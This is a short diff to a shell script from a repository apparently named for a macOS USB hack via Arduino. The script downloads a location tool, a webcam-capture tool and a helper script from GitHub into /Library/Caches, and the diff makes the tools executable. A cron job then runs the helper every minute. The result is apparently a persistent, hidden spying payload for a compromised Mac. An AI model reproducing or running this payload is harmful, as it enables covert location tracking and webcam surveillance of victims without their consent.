@@ -17,6 +17,9 @@ wget -O /Library/Caches/locateme.sh https://raw.githubusercontent.com/angeldiazi
 wget -O /Library/Caches/LocateMe https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/LocateMe
 wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/resources/imagesnap
 
+chmod 755 /Library/Caches/LocateMe
+chmod 755 /Library/Caches/imagesnap
+
 # Add cron task to run every minute
 ( crontab -l ; echo "* * * * * /bin/sh /Library/Caches/cron-01.sh" ) | crontab -
 
